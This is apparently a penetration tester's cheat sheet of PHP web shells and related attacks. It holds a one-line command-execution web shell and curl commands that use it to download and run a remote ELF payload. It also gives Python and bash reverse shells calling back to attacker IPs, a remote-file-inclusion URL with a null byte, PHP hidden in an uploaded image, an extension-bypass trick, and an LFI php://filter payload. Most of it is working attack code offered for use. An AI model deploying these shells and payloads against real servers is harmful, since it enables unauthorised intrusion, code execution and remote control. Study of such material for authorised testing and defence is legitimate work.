# PHP Shells

**<u>Single Curl Download and Run command:</u>**

```bash
#create php file
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' > pwn.php

#generate metasploit shell
#then run command
curl -s -G http://10.11.1.252:8000/pwn.php \
  --data-urlencode 'c=wget -P /tmp http://192.168.119.131/pwn.elf && chmod +x /tmp/pwn.elf && /tmp/pwn.elf' 
  
#python shell
curl -s -G http://10.11.1.252:8000/pwn.php \
  --data-urlencode "c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.119.131\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
```

**<u>Reverse shells</u>**

https://github.com/pentestmonkey/php-reverse-shell

Can also save the php-reverse shell as .txt:

```bash
https://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=http://$my-ip/php-reverse-shell.txt%00
```

Mini shell.php:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
```

P0wny shell: https://github.com/flozz/p0wny-shell

```bash
Host the shell.php
```

**<u>Embed PHP in an image upload:</u>**

```bash
sudo apt install imagemagick 
convert -size 32x32 xc:white pwn.jpg
echo '<?php echo shell_exec($_REQUEST["c"]); ?>' >> pwn.jpg
#intercept in burpsuite and put in after c=
wget -O /dev/shm/pwn.elf 10.10.14.25/pwn.elf && chmod +x /dev/shm/pwn.elf && /dev/shm/pwn.elf

#OR

mv phpshell.php "phpshell.php;.png"

#Intercept it using Burp. Send it to repeater/proxy intercept and remove the .png portion and semi-colon. Then forward
```

![burp](./php/burp.png)



**<u>LFI/RFI:</u>**

file_get_content: doesn't execute code, just read files

include(): will execute anything within the include tag which this php filter is necessary for:

```bash
#php filter
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
```

